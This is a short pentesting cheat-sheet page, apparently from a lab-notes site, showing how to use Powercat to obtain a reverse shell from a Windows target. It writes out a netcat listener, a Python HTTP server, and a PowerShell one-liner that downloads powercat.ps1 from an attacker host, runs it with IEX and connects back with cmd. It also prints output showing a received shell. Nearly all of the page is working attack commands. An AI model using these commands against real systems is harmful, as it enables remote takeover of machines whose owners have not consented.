---
layout: default
title: Powercat
parent: Shells
nav_order: 7
---

# Powercat

---

## Download (clone)

```bash
┌──(vagrant㉿kali)-[/opt/tools/powercat/powercat]
└─$ sudo git clone https://github.com/besimorhino/powercat.git
```

## Get Reverse Shell from Windows Target

Start Python HTTP server

```bash
python3 -m http.server 8080
```

Start Netcat Listener

```bash
nc -lvp 1337
```

Download the payload and execute it using PowerShell payload

```bash
C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
```

Receive reverse shell from target

```bash
┌──(vagrant㉿kali)-[/opt/tools/powercat/powercat]
└─$ nc -lvp 1337  listening on [any] 1337 ...
10.10.12.53: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.12.53] 49804
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\thm>
```
